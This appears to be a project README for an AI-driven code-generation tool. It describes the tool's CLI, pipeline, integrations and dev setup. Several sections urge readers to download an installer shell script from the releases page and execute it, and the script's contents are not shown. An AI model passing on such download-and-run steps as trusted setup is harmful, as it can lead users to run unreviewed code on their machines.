[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/releases)

# JAEGIS AI Web OS — Transform Docs into Production Apps Platform

![JAEGIS hero image](https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg)

Universal AI-powered application foundry that transforms architectural documentation into complete, production-ready applications. JAEGIS-AI-Web-OS parses architecture docs, builds services, scaffolds frontend and backend, wires CI/CD, and outputs deployable artifacts.

Badges
- ![AI](https://img.shields.io/badge/tech-AI-purple)
- ![Django](https://img.shields.io/badge/framework-Django-092E20?logo=django)
- ![FastAPI](https://img.shields.io/badge/framework-FastAPI-009688?logo=fastapi)
- ![React](https://img.shields.io/badge/ui-React-61DAFB?logo=react)
- Topics: ai, ai-powered, anthropic, automation, cli-tool, code-generation, django, documentation, enterprise, fastapi, nextjs, openai, python, react

Table of contents
- About
- Key features
- Architecture overview
- Quickstart (download & execute release)
- Command-line interface
- Code generation pipeline
- Integration matrix
- Example project flow
- Development setup
- Tests and CI
- Contributing
- Releases
- License
- Authors

About
JAEGIS-AI-Web-OS reads structured and unstructured architecture documents. It extracts entities, data models, endpoints, UI specs, auth rules, infra targets, and deployment policies. It maps those specs to code templates and runtime components. The system produces:
- Backend services (Django, FastAPI)
- Frontend apps (React, Next.js)
- API contracts (OpenAPI)
- Infra definitions (Docker, Terraform, Helm)
- CI/CD pipelines (GitHub Actions)

JAEGIS bridges architecture and running systems. Engineers keep control. The system outputs human-reviewable code that composes to production artifacts.

Key features
- Spec parsing: YAML, Markdown, DOCX, and plain text input.
- Natural language extraction: OpenAI and Anthropic model adapters for intent and constraint extraction.
- Multi-stack codegen: Django REST, FastAPI, React + Next.js UI scaffolds.
- Infra-as-code: Dockerfiles, Kubernetes manifests, Terraform modules.
- CI/CD templates: GitHub Actions with build, test, lint, and deploy stages.
- Local dev: Docker Compose profiles per generated app.
- Enterprise hooks: SSO, RBAC, audit logging, DB migrations.
- Extensible templates: Add templates for custom stacks and patterns.

Architecture overview
JAEGIS has three main layers:
1. Ingest layer
   - Parsers: handle doc formats.
   - NLP extractor: convert text to structured spec.
2. Orchestration layer
   - Planner: map spec to components and dependencies.
   - Generator: render code templates, produce manifests, link infra.
3. Output layer
   - Artifacts: zip files, Docker images, Helm charts.
   - CI/CD: push-ready pipelines and release metadata.

The system runs as a CLI and as a service. The CLI produces a local workspace. The service drives batch runs and enterprise pipelines.

Quickstart — download and execute release
Download the installer file from the releases page and execute it. The release file builds the runtime and scaffolds a starter workspace.

1) Visit or download the release:
- Releases page: https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/releases

2) Download the installer asset named jaegis-installer.sh from the releases page and run:
```bash
# after download to current directory
chmod +x jaegis-installer.sh
./jaegis-installer.sh
```

The installer creates a local workspace at ./jaegis-workspace and initializes a sample architecture spec.

Command-line interface
The CLI exposes primary commands:
- jaegis init --spec path/to/spec.yaml
- jaegis generate --target backend,frontend --stack django,react
- jaegis build --artifact api-server
- jaegis deploy --env staging
- jaegis diff --compare HEAD

Example session
```bash
# initialize a project from a spec
jaegis init --spec infra/specs/shop-arch.md

# generate backend and frontend
jaegis generate --target backend,frontend --stack fastapi,nextjs

# build containers
jaegis build --artifact web || jaegis build --artifact api

# deploy to staging via GitHub Actions or local kubectl
jaegis deploy --env staging
```

Flags and configuration
- --spec: path to input doc (YAML, Markdown)
- --stack: one of django, fastapi, nextjs, react
- --target: backend, frontend, infra, ci
- --out: output directory

Code generation pipeline
JAEGIS splits the pipeline into five phases:
1. Parse: Load input docs, detect format, produce AST.
2. Extract: Apply NLP models to produce canonical spec (entities, endpoints, UI, infra).
3. Plan: Create component map and dependency graph.
4. Render: Use templates to generate code, tests, and manifests.
5. Package: Build artifacts, create release metadata, produce Docker images.

Templates use Jinja2 for Python stacks and Handlebars for JavaScript stacks. Templates include unit tests and simple end-to-end checks.

Integrations
- LLMs: OpenAI, Anthropic (model adapters into extractor pipeline).
- Cloud: AWS, GCP, Azure (Terraform modules).
- Databases: PostgreSQL, MySQL, Redis.
- Auth: OAuth2, OpenID Connect, SAML adapters.
- Monitoring: Prometheus, Grafana, Sentry hooks.
- CI/CD: GitHub Actions, GitLab CI templates.
- Container runtimes: Docker, containerd, Kubernetes manifests.

Example project flow
1. Author a spec (Markdown):
```markdown
# Shop API
models:
  - Product:
      fields:
        - id: uuid
        - name: string
        - price: decimal
endpoints:
  - GET /products
  - POST /products
ui:
  - listProducts
  - createProduct
infra:
  db: postgresql
  message_bus: redis
```
2. Run:
```bash
jaegis init --spec shop.md
jaegis generate --stack fastapi,nextjs --target backend,frontend,infra
jaegis build --artifact all
jaegis deploy --env staging
```
3. Inspect ./jaegis-workspace/shop:
- backend/: FastAPI app with models and migrations.
- frontend/: Next.js app with pages and API calls.
- infra/: Terraform and k8s manifests.
- .github/workflows/: GitHub Actions for build and deploy.

Developer setup
Clone repository and prepare a dev environment:
```bash
git clone https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS.git
cd JAEGIS-AI-Web-OS
python -m venv .venv
source .venv/bin/activate
pip install -r dev-requirements.txt
```

Run tests and linters:
```bash
make test
make lint
```

Run local dev server:
```bash
# start template rendering server
uvicorn jaegis.service:app --reload
```

Docker
A dev Dockerfile helps reproduce the environment. Use the included docker-compose.dev.yml to boot services:
```bash
docker compose -f docker-compose.dev.yml up --build
```

Testing and CI
Tests include unit tests for parsing, generation rules, and end-to-end smoke tests for sample specs. The repo includes GitHub Actions workflows:
- unit-tests.yml
- integration-smoke.yml
- release.yml

The release workflow packages artifacts and creates GitHub releases. See Releases for binary assets.

Security and secrets
JAEGIS supports secrets via environment variables or a secrets provider. Use a secure vault for API keys. Add keys to CI as encrypted secrets for deployment steps.

Extensibility
Add a new template set:
1. Create templates/<stack-name> with render rules.
2. Register the template in template_registry.yaml.
3. Add a unit test under tests/templates.

Adding a model adapter (LLM)
1. Implement an adapter class in jaegis/adapters.
2. Register it in jaegis.settings under LLM_ADAPTERS.
3. Provide model configuration via .env or CI secrets.

Examples and demo apps
The repo contains sample specs in examples/:
- ecommerce.md
- crm.md
- analytics.md

Each example produces a full stack. Use the release installer to generate these samples locally.

Releases
Download the installer asset from the releases page and run it. The release contains:
- jaegis-installer.sh (installer script)
- jaegis-cli.tar.gz (CLI binary)
- templates.tar.gz (template packs)
- samples.zip (example specs)

Get the release and run the installer:
- Releases page: https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/releases

Changelog
The releases page includes changelog entries per release. Each release details new templates, bug fixes, and breaking changes.

Contributing
We accept issues and pull requests. Follow these steps:
1. Fork the repo.
2. Create a feature branch.
3. Run tests and linters.
4. Open a pull request with a clear description and linked issue.

Guidelines
- Write unit tests for new code.
- Keep functions small and focused.
- Document public APIs in docstrings.

Issue templates and PR templates exist under .github/ to guide submissions.

Code of conduct
Follow the standard code of conduct in CODE_OF_CONDUCT.md. Respect other contributors.

License
This project uses the MIT License. See LICENSE for details.

Authors and maintainers
- Primary: SAMRATRAJ72
- Contributors: See the Contributors section in the repository.

Contact
Open issues on GitHub for bugs and feature requests. Use pull requests for code changes.

Images and assets used
- Python logo: https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg
- React logo: https://raw.githubusercontent.com/devicons/devicon/master/icons/react/react-original-wordmark.svg
- FastAPI logo: https://seeklogo.com/images/F/fastapi-logo-7B78C2AEA5-seeklogo.com.png

Quick links
- Releases: https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/releases
- Issues: https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/issues
- Pull requests: https://github.com/SAMRATRAJ72/JAEGIS-AI-Web-OS/pulls

Command reference (cheatsheet)
- Initialize a project:
  jaegis init --spec path/to/spec.md
- Generate code:
  jaegis generate --stack django,react --target backend,frontend
- Build and test:
  jaegis build --artifact all && jaegis test
- Create a release:
  jaegis release --version 0.1.0

Common troubleshooting
- If a template fails, check generated logs in ./jaegis-workspace/<project>/.logs.
- If LLM extraction yields low-quality spec, adjust model config in jaegis/settings or swap model adapter.

Assets and binary distribution
Releases include the executable and template packs. Download jaegis-installer.sh from the releases page and execute it to bootstrap a local workspace and sample specs.

Developer notes
- Template rendering uses deterministic seeds for repeatable outputs.
- Tests lock template hashes to detect drift.
- Add new stacks by providing a mapping function from canonical spec to stack primitives.

This README serves as the main reference for the repository. For deeper guides, browse docs/ and examples/ in the repository.